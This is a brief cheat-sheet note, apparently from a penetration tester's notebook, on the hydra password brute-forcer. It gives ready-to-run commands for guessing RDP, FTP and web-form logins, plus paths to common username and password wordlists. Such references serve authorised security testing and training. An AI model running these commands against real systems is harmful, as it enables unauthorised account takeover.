---
tags:
  - tool
  - brute_forcing
---
# hydra

Brute force services

## Capabilities

```bash
# Brute force protocols
hydra -L /usr/share/seclists/Usernames/Names/names.txt -p 'Password123!' rdp://$IP
hydra -L /usr/share/seclists/Usernames/Names/names.txt -p 'Password123!' ftp://$IP

# Brute force HTTP post request
hydra -l 'username' -P /usr/share/wordlists/rockyou.txt http://example.com http-post-form "/index.php:fm_usr=user&fm_pwd=^PASS^:Login failed. Invalid"
```

Note: `L` and `P` are used for username and password respectively, lowercase either of them to specify a single value

### Wordlists

```bash
# Usernames
/usr/share/seclists/Usernames/Names/names.txt # 10177 lines

# Passwords (short)
/usr/share/seclists/Passwords/2020-200_most_used_passwords.txt # 197 lines

# Passwords (long)
/usr/share/wordlists/rockyou.txt # 14344392 lines
```